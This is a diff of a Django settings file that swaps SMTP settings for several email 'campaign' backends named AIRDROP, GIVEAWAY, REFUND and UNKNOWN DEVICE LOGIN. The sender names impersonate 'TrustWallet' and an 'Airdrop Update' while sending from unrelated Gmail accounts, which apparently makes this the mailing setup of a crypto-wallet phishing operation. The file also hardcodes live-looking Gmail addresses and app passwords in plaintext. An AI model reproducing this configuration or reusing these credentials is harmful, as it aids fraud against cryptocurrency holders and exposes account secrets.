@@ -149,8 +149,8 @@ DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'
 EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
 
 EMAIL_HOST = 'smtp.gmail.com'
-EMAIL_PORT = 587
-EMAIL_USE_TLS = 'True'
+EMAIL_PORT = 465
+EMAIL_USE_SSL = 'True'
 EMAIL_HOST_USER = 'cointracker.llc@gmail.com'
 # Replace with your Gmail address
 EMAIL_HOST_PASSWORD = 'lmpp zwmt ogxd wjik' # Your Gmail app password
@@ -163,8 +163,8 @@ CAMPAIGN_EMAIL_BACKENDS = {
     'AIRDROP': {
         'EMAIL_HOST': 'smtp.gmail.com',
         'EMAIL_PORT': 587,
-        'EMAIL_HOST_USER': 'Airdrop Update escrowtrade02@gmail.com',
-        'EMAIL_HOST_PASSWORD': 'lkeb fkzs dofo qxtp',
+        'EMAIL_HOST_USER': 'Airdrop Update decentralizedxchange@gmail.com',
+        'EMAIL_HOST_PASSWORD': 'dyuc bpbt zwqg jefe',
         'EMAIL_USE_TLS': True,
           # Timeout in seconds
 
@@ -172,23 +172,23 @@ CAMPAIGN_EMAIL_BACKENDS = {
     'GIVEAWAY': {
         'EMAIL_HOST': 'smtp.gmail.com',
         'EMAIL_PORT': 587,
-        'EMAIL_HOST_USER': 'TrustWallet escrowtrade02@gmail.com',
-        'EMAIL_HOST_PASSWORD': 'lkeb fkzs dofo qxtp',
+        'EMAIL_HOST_USER': 'TrustWallet decentralizedxchange@gmail.com',
+        'EMAIL_HOST_PASSWORD': 'dyuc bpbt zwqg jefe',
         'EMAIL_USE_TLS': True,
     },
     'REFUND': {
         'EMAIL_HOST': 'smtp.gmail.com',
         'EMAIL_PORT': 587,
-        'EMAIL_HOST_USER': 'TrustWallet escrowtrade02@gmail.com', # Replace with your Gmail address
-        'EMAIL_HOST_PASSWORD': 'lkeb fkzs dofo qxtp',
+        'EMAIL_HOST_USER': 'TrustWallet decentralizedxchange@gmail.com', # Replace with your Gmail address
+        'EMAIL_HOST_PASSWORD': 'dyuc bpbt zwqg jefe',
         'EMAIL_USE_TLS': True,
         'EMAIL_TIMEOUT': 60,
     },
     'UNKNOWN DEVICE LOGIN': {
         'EMAIL_HOST': 'smtp.gmail.com',
         'EMAIL_PORT': 465,
-        'EMAIL_HOST_USER': 'TrustWallet cointracker.llc@gmail.com',
-        'EMAIL_HOST_PASSWORD': 'lmpp zwmt ogxd wjik',
+        'EMAIL_HOST_USER': 'TrustWallet decentralizedxchange@gmail.com',
+        'EMAIL_HOST_PASSWORD': 'dyuc bpbt zwqg jefe',
         'EMAIL_USE_SSL': True,
     },
 
